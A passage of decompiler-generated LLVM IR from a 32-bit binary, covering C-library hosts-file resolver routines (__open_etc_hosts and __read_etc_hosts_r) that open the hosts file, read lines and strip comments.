  %v2_8056c30 = inttoptr i32 %v1_8056c30 to i8*
  %v3_8056c30 = load i8, i8* %v2_8056c30, align 1
  %v4_8056c30 = zext i8 %v3_8056c30 to i32
  %v2_8056c34 = mul nuw nsw i32 %v4_8056c2c, 256
  %v2_8056c37 = or i32 %v4_8056c30, %v2_8056c34
  %v1_8056c39 = load i32, i32* @ebp, align 4
  %v2_8056c39 = add i32 %v1_8056c39, 8
  %v3_8056c39 = inttoptr i32 %v2_8056c39 to i32*
  store i32 %v2_8056c37, i32* %v3_8056c39, align 4
  %v0_8056c3c = load i32, i32* @ebx, align 4
  %v1_8056c3c = add i32 %v0_8056c3c, 4
  %v2_8056c3c = inttoptr i32 %v1_8056c3c to i8*
  %v3_8056c3c = load i8, i8* %v2_8056c3c, align 1
  %v4_8056c3c = zext i8 %v3_8056c3c to i32
  %v0_8056c40 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056c40 = add i32 %v0_8056c40, 1
  %v2_8056c40 = inttoptr i32 %v1_8056c40 to i8*
  %v3_8056c40 = load i8, i8* %v2_8056c40, align 1
  %v4_8056c40 = zext i8 %v3_8056c40 to i32
  %v2_8056c44 = mul nuw i32 %v4_8056c3c, 16777216
  %v2_8056c47 = mul nuw nsw i32 %v4_8056c40, 65536
  %v1_8056c4a = add i32 %v0_8056c40, 2
  %v2_8056c4a = inttoptr i32 %v1_8056c4a to i8*
  %v3_8056c4a = load i8, i8* %v2_8056c4a, align 1
  %v4_8056c4a = zext i8 %v3_8056c4a to i32
  %v2_8056c4e = mul nuw nsw i32 %v4_8056c4a, 256
  %v2_8056c51 = or i32 %v2_8056c47, %v2_8056c44
  %v1_8056c53 = add i32 %v0_8056c40, 3
  %v2_8056c53 = inttoptr i32 %v1_8056c53 to i8*
  %v3_8056c53 = load i8, i8* %v2_8056c53, align 1
  %v4_8056c53 = zext i8 %v3_8056c53 to i32
  %v2_8056c57 = or i32 %v4_8056c53, %v2_8056c51
  %v2_8056c59 = or i32 %v2_8056c57, %v2_8056c4e
  store i32 %v2_8056c59, i32* @ecx, align 4
  %v1_8056c5b = load i32, i32* @ebp, align 4
  %v2_8056c5b = add i32 %v1_8056c5b, 12
  %v3_8056c5b = inttoptr i32 %v2_8056c5b to i32*
  store i32 %v2_8056c59, i32* %v3_8056c5b, align 4
  %v0_8056c5e = load i32, i32* @ebx, align 4
  %v1_8056c5e = add i32 %v0_8056c5e, 8
  %v2_8056c5e = inttoptr i32 %v1_8056c5e to i8*
  %v3_8056c5e = load i8, i8* %v2_8056c5e, align 1
  %v4_8056c5e = zext i8 %v3_8056c5e to i32
  %v1_8056c62 = add i32 %v0_8056c5e, 9
  %v2_8056c62 = inttoptr i32 %v1_8056c62 to i8*
  %v3_8056c62 = load i8, i8* %v2_8056c62, align 1
  %v4_8056c62 = zext i8 %v3_8056c62 to i32
  %v2_8056c66 = mul nuw nsw i32 %v4_8056c5e, 256
  %v1_8056c69 = add i32 %v0_8056c5e, 10
  %v2_8056c6c = or i32 %v4_8056c62, %v2_8056c66
  store i32 %v2_8056c6c, i32* @edx, align 4
  %v1_8056c6e = load i32, i32* @ebp, align 4
  %v2_8056c6e = add i32 %v1_8056c6e, 20
  %v3_8056c6e = inttoptr i32 %v2_8056c6e to i32*
  store i32 %v1_8056c69, i32* %v3_8056c6e, align 4
  %v0_8056c71 = load i32, i32* @edx, align 4
  %v1_8056c71 = load i32, i32* @ebp, align 4
  %v2_8056c71 = add i32 %v1_8056c71, 16
  %v3_8056c71 = inttoptr i32 %v2_8056c71 to i32*
  store i32 %v0_8056c71, i32* %v3_8056c71, align 4
  %v1_8056c7b = add i32 %v3_8056be7, 10
  %v1_8056c7e = load i32, i32* @ebp, align 4
  %v2_8056c7e = add i32 %v1_8056c7e, 24
  %v3_8056c7e = inttoptr i32 %v2_8056c7e to i32*
  store i32 %v1_8056c7b, i32* %v3_8056c7e, align 4
  %v4_8056c81 = load i32, i32* @edx, align 4
  %v5_8056c85 = icmp slt i32 %v1_8056bef, %v4_8056c81
  br i1 %v5_8056c85, label %dec_label_pc_8056c87, label %dec_label_pc_8056c8c

dec_label_pc_8056c87:                             ; preds = %dec_label_pc_8056bff
  br label %dec_label_pc_8056c90

dec_label_pc_8056c8c:                             ; preds = %dec_label_pc_8056bff
  %v1_8056c8c = load i32, i32* @edi, align 4
  %v2_8056c8c = add i32 %v4_8056c81, 10
  %v3_8056c8c = add i32 %v2_8056c8c, %v1_8056c8c
  br label %dec_label_pc_8056c90

dec_label_pc_8056c90:                             ; preds = %entry, %dec_label_pc_8056c87, %dec_label_pc_8056bf8, %dec_label_pc_8056c8c
  %v0_8056c96 = phi i32 [ %v4_8056bd5, %entry ], [ -1, %dec_label_pc_8056c87 ], [ %v1_8056bef, %dec_label_pc_8056bf8 ], [ %v3_8056c8c, %dec_label_pc_8056c8c ]
  %v2_8056c98 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056c98, i32* @ebx, align 4
  store i32 %v0_8056ba6, i32* @esi, align 4
  store i32 %v0_8056ba5, i32* @edi, align 4
  store i32 %v0_8056ba4, i32* @ebp, align 4
  ret i32 %v0_8056c96

; uselistorder directives
  uselistorder i32 %v1_8056bef, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8056be7, { 1, 0, 2 }
  uselistorder i32 %v4_8056bd5, { 1, 0, 2, 3 }
  uselistorder i32 24, { 31, 32, 21, 0, 33, 34, 35, 22, 6, 11, 38, 12, 13, 14, 36, 23, 24, 25, 26, 27, 28, 29, 40, 3, 37, 15, 16, 17, 18, 19, 20, 4, 5, 7, 8, 9, 2, 10, 30, 1, 39 }
  uselistorder i32 20, { 36, 37, 38, 39, 6, 22, 43, 9, 44, 40, 41, 7, 23, 24, 5, 12, 13, 35, 14, 15, 16, 25, 26, 27, 0, 28, 1, 29, 10, 30, 31, 46, 42, 8, 17, 18, 19, 20, 21, 32, 33, 34, 4, 3, 45, 11, 2 }
  uselistorder i32 9, { 19, 20, 21, 22, 9, 23, 13, 14, 5, 12, 3, 10, 15, 16, 17, 18, 8, 11, 6, 7, 1, 0, 24, 4, 25, 2 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9 }
  uselistorder i32 3, { 56, 57, 58, 59, 60, 61, 26, 3, 27, 16, 55, 7, 62, 28, 9, 8, 4, 1, 2, 0, 29, 5, 30, 48, 17, 49, 35, 36, 37, 38, 39, 40, 63, 18, 19, 41, 31, 15, 11, 12, 10, 13, 32, 47, 42, 34, 54, 33, 43, 44, 20, 45, 21, 46, 50, 51, 52, 53, 14, 22, 23, 24, 25, 6 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056c90, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_8056cad = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_805a605.567 to i32), i32 ptrtoint (i32* @global_var_805a5d0.555 to i32))
  store i32 %v3_8056cad, i32* @eax, align 4
  %v1_8056cb5 = icmp eq i32 %v3_8056cad, 0
  %v1_8056cb7 = icmp eq i1 %v1_8056cb5, false
  br i1 %v1_8056cb7, label %dec_label_pc_8056ccd, label %dec_label_pc_8056cb9

dec_label_pc_8056cb9:                             ; preds = %entry
  %v3_8056cc5 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_805a610.568 to i32), i32 ptrtoint (i32* @global_var_805a5d0.555 to i32))
  br label %dec_label_pc_8056ccd

dec_label_pc_8056ccd:                             ; preds = %entry, %dec_label_pc_8056cb9
  %v0_8056cd0 = phi i32 [ %v3_8056cad, %entry ], [ %v3_8056cc5, %dec_label_pc_8056cb9 ]
  ret i32 %v0_8056cd0

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_805a5d0.555 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8056ccd, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8056cd1 = load i32, i32* @ebp, align 4
  %v0_8056cd2 = load i32, i32* @edi, align 4
  %v0_8056cd3 = load i32, i32* @esi, align 4
  %v0_8056cd4 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8056ce2 = sub i32 0, %arg6
  %v1_8056ce4 = urem i32 %v1_8056ce2, 4
  %v2_8056ce4 = icmp eq i32 %v1_8056ce4, 0
  store i32 %v1_8056ce4, i32* %eax.global-to-local, align 4
  br i1 %v2_8056ce4, label %dec_label_pc_8056cf5, label %dec_label_pc_8056ce9

dec_label_pc_8056ce9:                             ; preds = %entry
  %v2_8056ce9 = sub i32 %arg7, %v1_8056ce4
  %v7_8056ce9 = icmp ugt i32 %v1_8056ce4, %arg7
  br i1 %v7_8056ce9, label %dec_label_pc_8056f99, label %dec_label_pc_8056cf1

dec_label_pc_8056cf1:                             ; preds = %dec_label_pc_8056ce9
  %v2_8056cf1 = add i32 %v1_8056ce4, %arg6
  store i32 %v2_8056cf1, i32* @ebx, align 4
  store i32 %v2_8056ce9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056cf5

dec_label_pc_8056cf5:                             ; preds = %entry, %dec_label_pc_8056cf1
  %v0_8056cfe = phi i32 [ %arg6, %entry ], [ %v2_8056cf1, %dec_label_pc_8056cf1 ]
  %v0_8056d01 = phi i32 [ %arg7, %entry ], [ %v2_8056ce9, %dec_label_pc_8056cf1 ]
  %tmp149 = icmp ult i32 %v0_8056d01, 32
  br i1 %tmp149, label %dec_label_pc_8056f99, label %dec_label_pc_8056cfe

dec_label_pc_8056cfe:                             ; preds = %dec_label_pc_8056cf5
  %v1_8056cfe = add i32 %v0_8056cfe, 32
  store i32 %v1_8056cfe, i32* %eax.global-to-local, align 4
  %v1_8056d01 = add i32 %v0_8056d01, -32
  store i32 %v1_8056d01, i32* @ebp, align 4
  %v5_8056d04 = inttoptr i32 %v1_8056cfe to i8*
  %v12_8056d08 = icmp eq i32 %arg4, 1
  br i1 %v12_8056d08, label %dec_label_pc_8056e2a, label %dec_label_pc_8056d13

dec_label_pc_8056d13:                             ; preds = %dec_label_pc_8056cfe
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8056d1a = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8056d1a, align 4
  %tmp150 = icmp ult i32 %v1_8056d01, 4
  br i1 %tmp150, label %dec_label_pc_8056f99, label %dec_label_pc_8056d26

dec_label_pc_8056d26:                             ; preds = %dec_label_pc_8056d13
  %v0_8056d26 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056d26 = add i32 %v0_8056d26, -36
  store i32 %v1_8056d26, i32* %eax.global-to-local, align 4
  %tmp151 = icmp ult i32 %v1_8056d26, 8
  br i1 %tmp151, label %dec_label_pc_8056f99, label %dec_label_pc_8056d32

dec_label_pc_8056d32:                             ; preds = %dec_label_pc_8056d26
  %v0_8056d32 = load i32, i32* @ebp, align 4
  %tmp152 = icmp ult i32 %v0_8056d32, 16
  br i1 %tmp152, label %dec_label_pc_8056f99, label %dec_label_pc_8056d3b

dec_label_pc_8056d3b:                             ; preds = %dec_label_pc_8056d32
  %v1_8056d3b = add i32 %v0_8056d26, -48
  store i32 %v1_8056d3b, i32* %eax.global-to-local, align 4
  %tmp153 = icmp ult i32 %v1_8056d3b, 8
  br i1 %tmp153, label %dec_label_pc_8056f99, label %dec_label_pc_8056d47

dec_label_pc_8056d47:                             ; preds = %dec_label_pc_8056d3b
  %v0_8056d47 = load i32, i32* @ebx, align 4
  %v1_8056d47 = add i32 %v0_8056d47, 48
  %v1_8056d4a = add i32 %v0_8056d26, -44
  store i32 %v1_8056d4a, i32* @ebp, align 4
  %v1_8056d51 = add i32 %v0_8056d26, -56
  store i32 %v1_8056d51, i32* @eax, align 4
  %v1_8056d54 = add i32 %v0_8056d47, 36
  store i32 %v1_8056d54, i32* @edi, align 4
  %v7_8056d57 = icmp ult i32 %v1_8056d51, %v1_8056d4a
  br i1 %v7_8056d57, label %dec_label_pc_8056d60, label %dec_label_pc_8056d5b

dec_label_pc_8056d5b:                             ; preds = %dec_label_pc_8056d47
  %v1_8056d5b = add i32 %v0_8056d47, 44
  store i32 %v1_8056d5b, i32* @esi, align 4
  br label %dec_label_pc_8056d65

dec_label_pc_8056d60:                             ; preds = %dec_label_pc_8056d47
  %v1_8056d60 = add i32 %v0_8056d47, 56
  store i32 %v1_8056d60, i32* @esi, align 4
  store i32 %v1_8056d51, i32* @ebp, align 4
  br label %dec_label_pc_8056d65

dec_label_pc_8056d65:                             ; preds = %dec_label_pc_8056d5b, %dec_label_pc_8056d60
  %v0_8056d65 = phi i32 [ %v1_8056d4a, %dec_label_pc_8056d5b ], [ %v1_8056d51, %dec_label_pc_8056d60 ]
  %tmp154 = icmp ult i32 %v0_8056d65, 80
  br i1 %tmp154, label %dec_label_pc_8056f99, label %dec_label_pc_8056d6e

dec_label_pc_8056d6e:                             ; preds = %dec_label_pc_8056d65
  %v0_8056d6e = call i32 @__open_etc_hosts()
  store i32 %v0_8056d6e, i32* %eax.global-to-local, align 4
  %v1_8056d77 = icmp eq i32 %v0_8056d6e, 0
  br i1 %v1_8056d77, label %dec_label_pc_8056d9b, label %dec_label_pc_8056d7b

dec_label_pc_8056d7b:                             ; preds = %dec_label_pc_8056d6e
  store i32 %v1_8056cfe, i32* %edx.global-to-local, align 4
  store i32 %v1_8056d47, i32* %eax.global-to-local, align 4
  store i8* %v5_8056d04, i8** %stack_var_-44, align 4
  %v0_8056d86 = load i32, i32* @edi, align 4
  %v0_8056d92 = load i32, i32* @esi, align 4
  %v5_8056d92 = inttoptr i32 %v0_8056d92 to i8*
  br label %dec_label_pc_8056e49

dec_label_pc_8056d9b:                             ; preds = %dec_label_pc_8056d6e
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8056d9f = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8056d9f, align 4
  %v1_8056da5 = call i32 @__errno_location(i32 0)
  store i32 %v1_8056da5, i32* %eax.global-to-local, align 4
  %v1_8056daa = inttoptr i32 %v1_8056da5 to i32*
  %v2_8056daa = load i32, i32* %v1_8056daa, align 4
  store i32 %v2_8056daa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056f99

dec_label_pc_8056db5:                             ; preds = %dec_label_pc_8056f1c
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8056db9 = load i8*, i8** %stack_var_-44, align 4
  %v3_8056db9 = ptrtoint i8* %v2_8056db9 to i32
  %v2_8056dbc = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8056db9, i32* %v2_8056dbc, align 4
  %v0_8056dbe = load i32, i32* %eax.global-to-local, align 4
  %v1_8056dbe = add i32 %v0_8056dbe, 4
  %v2_8056dbe = inttoptr i32 %v1_8056dbe to i32*
  store i32 0, i32* %v2_8056dbe, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8056dc9 = load i32, i32* @ebx, align 4
  %v1_8056dc9 = add i32 %v0_8056dc9, 4
  %v2_8056dc9 = inttoptr i32 %v1_8056dc9 to i32*
  %v3_8056dc9 = load i32, i32* %v2_8056dc9, align 4
  store i32 %v3_8056dc9, i32* %eax.global-to-local, align 4
  store i32 %v3_8056dc9, i32* %arg5, align 4
  %v0_8056dce = load i32, i32* %edx.global-to-local, align 4
  %v1_8056dce = add i32 %v0_8056dce, 8
  %v2_8056dce = inttoptr i32 %v1_8056dce to i32*
  store i32 2, i32* %v2_8056dce, align 4
  %v0_8056dd5 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056dd5 = add i32 %v0_8056dd5, 12
  %v2_8056dd5 = inttoptr i32 %v1_8056dd5 to i32*
  store i32 4, i32* %v2_8056dd5, align 4
  br label %dec_label_pc_8056e0e

dec_label_pc_8056de2:                             ; preds = %dec_label_pc_8056f3e
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_8056dea = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8056dea, align 4
  %v0_8056dec = load i32, i32* %edx.global-to-local, align 4
  %v1_8056dec = add i32 %v0_8056dec, 4
  %v2_8056dec = inttoptr i32 %v1_8056dec to i32*
  store i32 0, i32* %v2_8056dec, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8056df7 = load i32, i32* @ebx, align 4
  %v1_8056df7 = add i32 %v0_8056df7, 4
  %v2_8056df7 = inttoptr i32 %v1_8056df7 to i32*
  %v3_8056df7 = load i32, i32* %v2_8056df7, align 4
  store i32 %v3_8056df7, i32* %eax.global-to-local, align 4
  store i32 %v3_8056df7, i32* %arg5, align 4
  %v0_8056dfc = load i32, i32* %edx.global-to-local, align 4
  %v1_8056dfc = add i32 %v0_8056dfc, 8
  %v2_8056dfc = inttoptr i32 %v1_8056dfc to i32*
  store i32 10, i32* %v2_8056dfc, align 4
  %v0_8056e03 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056e03 = add i32 %v0_8056e03, 12
  %v2_8056e03 = inttoptr i32 %v1_8056e03 to i32*
  store i32 16, i32* %v2_8056e03, align 4
  br label %dec_label_pc_8056e0e

dec_label_pc_8056e0e:                             ; preds = %dec_label_pc_8056db5, %dec_label_pc_8056de2
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8056db5 ], [ %stack_var_-32.0, %dec_label_pc_8056de2 ]
  %v1_8056e0e = load i32, i32* %edx.global-to-local, align 4
  %v2_8056e0e = add i32 %v1_8056e0e, 16
  %v3_8056e0e = inttoptr i32 %v2_8056e0e to i32*
  store i32 %storemerge, i32* %v3_8056e0e, align 4
  %v0_8056e11 = load i32, i32* @ebx, align 4
  %v1_8056e11 = add i32 %v0_8056e11, 8
  %v1_8056e14 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056e14 = add i32 %v1_8056e14, 4
  %v3_8056e14 = inttoptr i32 %v2_8056e14 to i32*
  store i32 %v1_8056e11, i32* %v3_8056e14, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_8056e1b = load i32, i32* %edx.global-to-local, align 4
  %v2_8056e1b = inttoptr i32 %arg8 to i32*
  store i32 %v0_8056e1b, i32* %v2_8056e1b, align 4
  br label %dec_label_pc_8056f79

dec_label_pc_8056e2a:                             ; preds = %dec_label_pc_8056cfe
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8056e49

dec_label_pc_8056e49:                             ; preds = %dec_label_pc_8056d7b, %dec_label_pc_8056e2a
  %v1_8056e4d.pre-phi = phi i32* [ %v1_8056d1a, %dec_label_pc_8056d7b ], [ %.pre, %dec_label_pc_8056e2a ]
  %stack_var_-32.0 = phi i32 [ %v1_8056d47, %dec_label_pc_8056d7b ], [ 0, %dec_label_pc_8056e2a ]
  %stack_var_-36.0 = phi i32 [ %v1_8056cfe, %dec_label_pc_8056d7b ], [ 0, %dec_label_pc_8056e2a ]
  %stack_var_-40.0 = phi i32 [ %v0_8056d86, %dec_label_pc_8056d7b ], [ 0, %dec_label_pc_8056e2a ]
  %stack_var_4.0 = phi i32 [ %v0_8056d6e, %dec_label_pc_8056d7b ], [ %arg1, %dec_label_pc_8056e2a ]
  %stack_var_-20.0 = phi i8* [ %v5_8056d92, %dec_label_pc_8056d7b ], [ %v5_8056d04, %dec_label_pc_8056e2a ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8056e4d.pre-phi, align 4
  %v4_8056f65 = ptrtoint i8* %stack_var_-20.0 to i32
  %v2_8056f02 = inttoptr i32 %arg2 to i8*
  %v0_8056f5f120127 = load i32, i32* @edx, align 4
  %v3_8056f69121128 = call i32 @fgets(i32 %v4_8056f65, i32 %stack_var_4.0, i32 %v0_8056f5f120127)
  store i32 %v3_8056f69121128, i32* @eax, align 4
  %v1_8056f71122129 = icmp eq i32 %v3_8056f69121128, 0
  %v1_8056f73123130 = icmp eq i1 %v1_8056f71122129, false
  br i1 %v1_8056f73123130, label %dec_label_pc_8056e60.lr.ph.lr.ph, label %dec_label_pc_8056f79

dec_label_pc_8056e60.lr.ph.lr.ph:                 ; preds = %dec_label_pc_8056e49
  %v12_8056f37 = icmp eq i32 %arg3, 10
  %v12_8056f15 = icmp eq i32 %arg3, 2
  %v12_8056edc = icmp eq i32 %arg4, 2
  %v1_8056ee1 = icmp eq i1 %v12_8056edc, false
  %v1_8056f1a = icmp eq i1 %v12_8056f15, false
  %v1_8056f3c = icmp eq i1 %v12_8056f37, false
  br label %dec_label_pc_8056e60.lr.ph

dec_label_pc_8056e60.lr.ph:                       ; preds = %dec_label_pc_8056e60.lr.ph.lr.ph, %dec_label_pc_8056f5f.outer.backedge
  %stack_var_-28.0.ph131 = phi i32 [ 1, %dec_label_pc_8056e60.lr.ph.lr.ph ], [ 2, %dec_label_pc_8056f5f.outer.backedge ]
  br label %dec_label_pc_8056e60

dec_label_pc_8056e60:                             ; preds = %dec_label_pc_8056e60.lr.ph, %dec_label_pc_8056f5f.backedge
  %v3_8056e68 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_8056e68, i32* @eax, align 4
  %v1_8056e70 = icmp eq i32 %v3_8056e68, 0
  br i1 %v1_8056e70, label %dec_label_pc_8056e77, label %dec_label_pc_8056e74

dec_label_pc_8056e74:                             ; preds = %dec_label_pc_8056e60
  %v1_8056e74 = inttoptr i32 %v3_8056e68 to i8*
  store i8 0, i8* %v1_8056e74, align 1
  br label %dec_label_pc_8056e77

dec_label_pc_8056e77:                             ; preds = %dec_label_pc_8056e60, %dec_label_pc_8056e74
  store i32 %v4_8056f65, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8056eb732 = load i8, i8* %stack_var_-20.0, align 1
  %v3_8056eb733 = icmp eq i8 %v2_8056eb732, 0
  %v1_8056eba39 = icmp eq i1 %v3_8056eb733, false
  br i1 %v1_8056eba39, label %dec_label_pc_8056e83.preheader.preheader, label %dec_label_pc_8056ebc

dec_label_pc_8056e83.preheader.preheader:         ; preds = %dec_label_pc_8056e77
  %v4_8056e8397.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8056e83.preheader

dec_label_pc_8056e7f:                             ; preds = %dec_label_pc_8056e89
  store i8 0, i8* %v1_8056e83102, align 1
  %v0_8056e82 = load i32, i32* @ecx, align 4
  %v1_8056e82 = add i32 %v0_8056e82, 1
  store i32 %v1_8056e82, i32* @ecx, align 4
  %v1_8056e83 = inttoptr i32 %v1_8056e82 to i8*
  %v2_8056e83 = load i8, i8* %v1_8056e83, align 1
  %v3_8056e83 = zext i8 %v2_8056e83 to i32
  %v4_8056e83 = load i32, i32* %eax.global-to-local, align 4
  %v5_8056e83 = and i32 %v4_8056e83, -256
  %v6_8056e83 = or i32 %v5_8056e83, %v3_8056e83
  store i32 %v6_8056e83, i32* @eax, align 4
  %v4_8056e85 = icmp eq i8 %v2_8056e83, 0
  br i1 %v4_8056e85, label %dec_label_pc_8056e83.dec_label_pc_8056ebc.loopexit_crit_edge, label %dec_label_pc_8056e89

dec_label_pc_8056e89:                             ; preds = %dec_label_pc_8056e83.preheader, %dec_label_pc_8056e7f
  %v2_8056e83103 = phi i8 [ %v2_8056e83, %dec_label_pc_8056e7f ], [ %v2_8056e8395, %dec_label_pc_8056e83.preheader ]
  %v1_8056e83102 = phi i8* [ %v1_8056e83, %dec_label_pc_8056e7f ], [ %v1_8056e8394, %dec_label_pc_8056e83.preheader ]
  %v0_8056e7f101 = phi i32 [ %v1_8056e82, %dec_label_pc_8056e7f ], [ %v0_8056e8347, %dec_label_pc_8056e83.preheader ]
  %v2_8056e89 = sext i8 %v2_8056e83103 to i32
  store i32 %v2_8056e89, i32* @edx, align 4
  %v0_8056e8c = load i32, i32* @global_var_805b298, align 8
  store i32 %v0_8056e8c, i32* %eax.global-to-local, align 4
  %v2_8056e91 = mul nsw i32 %v2_8056e89, 2
  %v3_8056e91 = add i32 %v0_8056e8c, %v2_8056e91
  %v4_8056e91 = inttoptr i32 %v3_8056e91 to i8*
  %v5_8056e91 = load i8, i8* %v4_8056e91, align 1
  %v6_8056e91 = and i8 %v5_8056e91, 32
  %v7_8056e91 = icmp eq i8 %v6_8056e91, 0
  %v1_8056e95 = icmp eq i1 %v7_8056e91, false
  br i1 %v1_8056e95, label %dec_label_pc_8056e7f, label %dec_label_pc_8056e97

dec_label_pc_8056e97:                             ; preds = %dec_label_pc_8056e89
  %v0_8056e97 = load i32, i32* @edi, align 4
  %v1_8056e97 = add i32 %v0_8056e97, -6
  %v6_8056e97 = sub i32 5, %v0_8056e97
  %v7_8056e97 = and i32 %v6_8056e97, %v0_8056e97
  %v8_8056e97 = icmp slt i32 %v7_8056e97, 0
  %v9_8056e97 = icmp eq i32 %v1_8056e97, 0
  %v10_8056e97 = icmp slt i32 %v1_8056e97, 0
  %v3_8056e9a = icmp eq i1 %v10_8056e97, %v8_8056e97
  %v4_8056e9a = icmp eq i1 %v9_8056e97, false
  %v5_8056e9a = and i1 %v4_8056e9a, %v3_8056e9a
  br i1 %v5_8056e9a, label %dec_label_pc_8056ea3.preheader, label %dec_label_pc_8056e9c

dec_label_pc_8056e9c:                             ; preds = %dec_label_pc_8056e97
  %v1_8056e9c = load i32, i32* @ebx, align 4
  %v3_8056e9c = mul i32 %v0_8056e97, 4
  %v4_8056e9c = add i32 %v1_8056e9c, %v3_8056e9c
  %v5_8056e9c = inttoptr i32 %v4_8056e9c to i32*
  store i32 %v0_8056e7f101, i32* %v5_8056e9c, align 4
  %v0_8056e9f = load i32, i32* @edi, align 4
  %v1_8056e9f = add i32 %v0_8056e9f, 1
  store i32 %v1_8056e9f, i32* @edi, align 4
  %v0_8056ea3.pre.pre = load i32, i32* @ecx, align 4
  %v4_8056ea3.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056ea3.preheader

dec_label_pc_8056ea3.preheader:                   ; preds = %dec_label_pc_8056e9c, %dec_label_pc_8056e97
  %v4_8056ea3.pre = phi i32 [ %v4_8056ea3.pre.pre, %dec_label_pc_8056e9c ], [ %v0_8056e8c, %dec_label_pc_8056e97 ]
  %v0_8056ea3.pre = phi i32 [ %v0_8056ea3.pre.pre, %dec_label_pc_8056e9c ], [ %v0_8056e7f101, %dec_label_pc_8056e97 ]
  %v1_8056ebc52 = phi i32 [ %v1_8056e9f, %dec_label_pc_8056e9c ], [ %v0_8056e97, %dec_label_pc_8056e97 ]
  %v1_8056ea3104 = inttoptr i32 %v0_8056ea3.pre to i8*
  %v2_8056ea3105 = load i8, i8* %v1_8056ea3104, align 1
  %v3_8056ea3106 = zext i8 %v2_8056ea3105 to i32
  %v5_8056ea3107 = and i32 %v4_8056ea3.pre, -256
  %v6_8056ea3108 = or i32 %v3_8056ea3106, %v5_8056ea3107
  store i32 %v6_8056ea3108, i32* @eax, align 4
  %v4_8056ea5109 = icmp eq i8 %v2_8056ea3105, 0
  br i1 %v4_8056ea5109, label %dec_label_pc_8056eb7.loopexit, label %dec_label_pc_8056ea9.lr.ph

dec_label_pc_8056ea9.lr.ph:                       ; preds = %dec_label_pc_8056ea3.preheader
  %v0_8056eac.pre = load i32, i32* @global_var_805b298, align 8
  br label %dec_label_pc_8056ea9

dec_label_pc_8056ea2:                             ; preds = %dec_label_pc_8056ea9
  %v1_8056ea2 = add i32 %v0_8056eb7110, 1
  store i32 %v1_8056ea2, i32* @ecx, align 4
  %v1_8056ea3 = inttoptr i32 %v1_8056ea2 to i8*
  %v2_8056ea3 = load i8, i8* %v1_8056ea3, align 1
  %v3_8056ea3 = zext i8 %v2_8056ea3 to i32
  %v5_8056ea3 = and i32 %v0_8056eac.pre, -256
  %v6_8056ea3 = or i32 %v3_8056ea3, %v5_8056ea3
  store i32 %v6_8056ea3, i32* @eax, align 4
  %v4_8056ea5 = icmp eq i8 %v2_8056ea3, 0
  br i1 %v4_8056ea5, label %dec_label_pc_8056eb7.loopexit, label %dec_label_pc_8056ea9

dec_label_pc_8056ea9:                             ; preds = %dec_label_pc_8056ea9.lr.ph, %dec_label_pc_8056ea2
  %v2_8056ea3112 = phi i8 [ %v2_8056ea3105, %dec_label_pc_8056ea9.lr.ph ], [ %v2_8056ea3, %dec_label_pc_8056ea2 ]
  %v1_8056ea3111 = phi i8* [ %v1_8056ea3104, %dec_label_pc_8056ea9.lr.ph ], [ %v1_8056ea3, %dec_label_pc_8056ea2 ]
  %v0_8056eb7110 = phi i32 [ %v0_8056ea3.pre, %dec_label_pc_8056ea9.lr.ph ], [ %v1_8056ea2, %dec_label_pc_8056ea2 ]
  %v2_8056ea9 = sext i8 %v2_8056ea3112 to i32
  store i32 %v2_8056ea9, i32* @edx, align 4
  store i32 %v0_8056eac.pre, i32* @eax, align 4
  %v2_8056eb1 = mul nsw i32 %v2_8056ea9, 2
  %v3_8056eb1 = add i32 %v0_8056eac.pre, %v2_8056eb1
  %v4_8056eb1 = inttoptr i32 %v3_8056eb1 to i8*
  %v5_8056eb1 = load i8, i8* %v4_8056eb1, align 1
  %v6_8056eb1 = and i8 %v5_8056eb1, 32
